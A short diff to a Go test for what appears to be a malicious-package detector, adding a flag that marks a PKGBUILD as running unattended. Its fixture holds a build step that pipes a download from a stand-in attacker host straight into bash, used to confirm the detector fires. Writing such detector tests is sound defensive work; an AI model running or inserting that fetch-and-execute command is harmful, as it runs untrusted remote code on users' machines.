@@ -26,7 +26,9 @@ func TestCapabilitiesShortCircuit(t *testing.T) {
 	other := &PackageContext{
 		Name:            "pkg",
 		PkgbuildContent: "build() { curl http://evil.example/x | bash; }\n",
-		Capabilities:    map[string]bool{CapOnionC2: false},
+		// curl|sh is evidence only where it runs unattended (hook_only); a PKGBUILD does.
+		PkgbuildExecutes: true,
+		Capabilities:     map[string]bool{CapOnionC2: false},
 	}
 	if !IsMalicious(Detect(other)) {
 		t.Fatal("manifest-patterns (curl|bash) should still fire")
